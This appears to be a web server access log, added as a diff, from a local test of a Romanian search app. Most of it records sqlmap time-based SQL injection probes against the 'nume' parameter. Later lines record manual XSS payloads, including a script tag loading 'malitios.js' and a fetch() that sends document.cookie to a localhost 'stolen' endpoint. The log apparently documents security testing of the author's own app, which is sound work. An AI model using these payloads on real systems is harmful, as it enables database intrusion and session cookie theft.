+[2026-01-19T21:42:53.174Z] GET /cauta?nume=ion%27%29%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.191Z] GET /cauta?nume=ion%27%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.192Z] GET /cauta?nume=ion%27%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.211Z] GET /cauta?nume=ion%29%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.213Z] GET /cauta?nume=ion%29%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.235Z] GET /cauta?nume=ion%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.236Z] GET /cauta?nume=ion%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.270Z] GET /cauta?nume=ion%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.271Z] GET /cauta?nume=ion%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.288Z] GET /cauta?nume=ion%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.289Z] GET /cauta?nume=ion%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.307Z] GET /cauta?nume=ion%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.308Z] GET /cauta?nume=ion%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.331Z] GET /cauta?nume=ion%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.332Z] GET /cauta?nume=ion%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.358Z] GET /cauta?nume=ion%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%28112%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.359Z] GET /cauta?nume=ion%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%28112%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.375Z] GET /cauta?nume=ion%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%28112%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.376Z] GET /cauta?nume=ion%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%28112%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.399Z] GET /cauta?nume=ion%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%28112%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.401Z] GET /cauta?nume=ion%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%28112%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.420Z] GET /cauta?nume=ion%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%28112%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.421Z] GET /cauta?nume=ion%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%28112%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.478Z] GET /cauta?nume=ion%27%29%20AND%20%28SELECT%208678%20FROM%20%28SELECT%28SLEEP%285%29%29%29lTZj%29%20AND%20%28%27aBHY%27%3D%27aBHY - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.481Z] GET /cauta?nume=ion%27%29%20AND%20%28SELECT%208678%20FROM%20%28SELECT%28SLEEP%285%29%29%29lTZj%29%20AND%20%28%27aBHY%27%3D%27aBHY - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.501Z] GET /cauta?nume=ion%27%20AND%20%28SELECT%208678%20FROM%20%28SELECT%28SLEEP%285%29%29%29lTZj%29%20AND%20%27zvsH%27%3D%27zvsH - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.502Z] GET /cauta?nume=ion%27%20AND%20%28SELECT%208678%20FROM%20%28SELECT%28SLEEP%285%29%29%29lTZj%29%20AND%20%27zvsH%27%3D%27zvsH - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.520Z] GET /cauta?nume=ion%29%20AND%20%28SELECT%208678%20FROM%20%28SELECT%28SLEEP%285%29%29%29lTZj%29%20AND%20%282000%3D2000 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.521Z] GET /cauta?nume=ion%29%20AND%20%28SELECT%208678%20FROM%20%28SELECT%28SLEEP%285%29%29%29lTZj%29%20AND%20%282000%3D2000 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.596Z] GET /cauta?nume=ion%20AND%20%28SELECT%208678%20FROM%20%28SELECT%28SLEEP%285%29%29%29lTZj%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.612Z] GET /cauta?nume=ion%20AND%20%28SELECT%208678%20FROM%20%28SELECT%28SLEEP%285%29%29%29lTZj%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.710Z] GET /cauta?nume=ion%20AND%20%28SELECT%208678%20FROM%20%28SELECT%28SLEEP%285%29%29%29lTZj%29--%20mvRk - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.723Z] GET /cauta?nume=ion%20AND%20%28SELECT%208678%20FROM%20%28SELECT%28SLEEP%285%29%29%29lTZj%29--%20mvRk - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.809Z] GET /cauta?nume=ion%27%29%20AND%201051%3D%28SELECT%201051%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27rBaf%27%3D%27rBaf - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.811Z] GET /cauta?nume=ion%27%29%20AND%201051%3D%28SELECT%201051%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27rBaf%27%3D%27rBaf - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.833Z] GET /cauta?nume=ion%27%20AND%201051%3D%28SELECT%201051%20FROM%20PG_SLEEP%285%29%29%20AND%20%27Udtk%27%3D%27Udtk - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.834Z] GET /cauta?nume=ion%27%20AND%201051%3D%28SELECT%201051%20FROM%20PG_SLEEP%285%29%29%20AND%20%27Udtk%27%3D%27Udtk - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.854Z] GET /cauta?nume=ion%29%20AND%201051%3D%28SELECT%201051%20FROM%20PG_SLEEP%285%29%29%20AND%20%289671%3D9671 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.855Z] GET /cauta?nume=ion%29%20AND%201051%3D%28SELECT%201051%20FROM%20PG_SLEEP%285%29%29%20AND%20%289671%3D9671 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.875Z] GET /cauta?nume=ion%20AND%201051%3D%28SELECT%201051%20FROM%20PG_SLEEP%285%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.877Z] GET /cauta?nume=ion%20AND%201051%3D%28SELECT%201051%20FROM%20PG_SLEEP%285%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.899Z] GET /cauta?nume=ion%20AND%201051%3D%28SELECT%201051%20FROM%20PG_SLEEP%285%29%29--%20dHyL - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.900Z] GET /cauta?nume=ion%20AND%201051%3D%28SELECT%201051%20FROM%20PG_SLEEP%285%29%29--%20dHyL - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.938Z] GET /cauta?nume=ion%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27uOWD%27%3D%27uOWD - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.939Z] GET /cauta?nume=ion%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27uOWD%27%3D%27uOWD - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.958Z] GET /cauta?nume=ion%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27XmPw%27%3D%27XmPw - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.959Z] GET /cauta?nume=ion%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27XmPw%27%3D%27XmPw - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.976Z] GET /cauta?nume=ion%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%281262%3D1262 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.978Z] GET /cauta?nume=ion%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%281262%3D1262 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.000Z] GET /cauta?nume=ion%20WAITFOR%20DELAY%20%270%3A0%3A5%27 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.001Z] GET /cauta?nume=ion%20WAITFOR%20DELAY%20%270%3A0%3A5%27 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.019Z] GET /cauta?nume=ion%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20HHnp - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.021Z] GET /cauta?nume=ion%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20HHnp - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.051Z] GET /cauta?nume=ion%27%29%20AND%205245%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2897%29%7C%7CCHR%2880%29%7C%7CCHR%2878%29%2C5%29%20AND%20%28%27SgRv%27%3D%27SgRv - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.052Z] GET /cauta?nume=ion%27%29%20AND%205245%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2897%29%7C%7CCHR%2880%29%7C%7CCHR%2878%29%2C5%29%20AND%20%28%27SgRv%27%3D%27SgRv - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.085Z] GET /cauta?nume=ion%27%20AND%205245%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2897%29%7C%7CCHR%2880%29%7C%7CCHR%2878%29%2C5%29%20AND%20%27zrhX%27%3D%27zrhX - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.087Z] GET /cauta?nume=ion%27%20AND%205245%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2897%29%7C%7CCHR%2880%29%7C%7CCHR%2878%29%2C5%29%20AND%20%27zrhX%27%3D%27zrhX - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.108Z] GET /cauta?nume=ion%29%20AND%205245%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2897%29%7C%7CCHR%2880%29%7C%7CCHR%2878%29%2C5%29%20AND%20%282869%3D2869 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.109Z] GET /cauta?nume=ion%29%20AND%205245%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2897%29%7C%7CCHR%2880%29%7C%7CCHR%2878%29%2C5%29%20AND%20%282869%3D2869 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.126Z] GET /cauta?nume=ion%20AND%205245%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2897%29%7C%7CCHR%2880%29%7C%7CCHR%2878%29%2C5%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.128Z] GET /cauta?nume=ion%20AND%205245%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2897%29%7C%7CCHR%2880%29%7C%7CCHR%2878%29%2C5%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.150Z] GET /cauta?nume=ion%20AND%205245%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2897%29%7C%7CCHR%2880%29%7C%7CCHR%2878%29%2C5%29--%20MLXU - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:54.151Z] GET /cauta?nume=ion%20AND%205245%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2897%29%7C%7CCHR%2880%29%7C%7CCHR%2878%29%2C5%29--%20MLXU - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T22:28:25.826Z] GET /cauta?q=%3Cscript%20src=%22http://localhost:5000/static/malitios.js%22%3E%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:28:25.830Z] GET /cauta?q=%3Cscript%20src=%22http://localhost:5000/static/malitios.js%22%3E%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:28:25.952Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:28:25.983Z] GET /favicon.ico - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:28:45.166Z] GET /cauta?q=%3Cscript%3Ealert(%27atac%20XSS%27)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:28:45.168Z] GET /cauta?q=%3Cscript%3Ealert(%27atac%20XSS%27)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:28:45.227Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:28:48.302Z] GET /profile-image/utilizator - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:28:48.310Z] GET /profile-image/utilizator - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:29:18.163Z] GET /cauta?nume=a - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:29:18.164Z] GET /cauta?nume=a - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:29:21.008Z] GET /cauta?nume=ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:29:21.009Z] GET /cauta?nume=ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:29:32.117Z] GET /cauta?nume=%3Cscript%3Efetch(%27http://localhost:5000/api/date?stolen=%27+document.cookie)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:29:32.120Z] GET /cauta?nume=%3Cscript%3Efetch(%27http://localhost:5000/api/date?stolen=%27+document.cookie)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:31:26.693Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:31:30.906Z] GET /cauta?nume=%3Cscript%3Efetch(%27http://localhost:5000/api/date?stolen=%27+document.cookie)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:31:30.907Z] GET /cauta?nume=%3Cscript%3Efetch(%27http://localhost:5000/api/date?stolen=%27+document.cookie)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:31:30.959Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:32:17.655Z] GET / - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:32:21.347Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:32:27.101Z] GET /cauta?nume=%3Cscript%3Efetch(%27http://localhost:5000/api/date?stolen=%27+document.cookie)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:32:27.103Z] GET /cauta?nume=%3Cscript%3Efetch(%27http://localhost:5000/api/date?stolen=%27+document.cookie)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:32:27.167Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:32:30.830Z] GET /cauta?nume=%3Cscript%3Efetch(%27http://localhost:5000/api/date?stolen=%27+document.cookie)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:32:30.831Z] GET /cauta?nume=%3Cscript%3Efetch(%27http://localhost:5000/api/date?stolen=%27+document.cookie)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:32:30.887Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:32:40.794Z] GET / - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:32:40.872Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:35:30.887Z] GET /cauta?nume=Ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:35:30.889Z] GET /cauta?nume=Ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:35:30.965Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:35:35.765Z] GET /cauta?nume=Ionnn - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:35:35.766Z] GET /cauta?nume=Ionnn - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:35:35.829Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:35:41.283Z] GET /cauta?nume=Roxana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:35:41.285Z] GET /cauta?nume=Roxana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:35:41.347Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:36:28.750Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:36:28.776Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
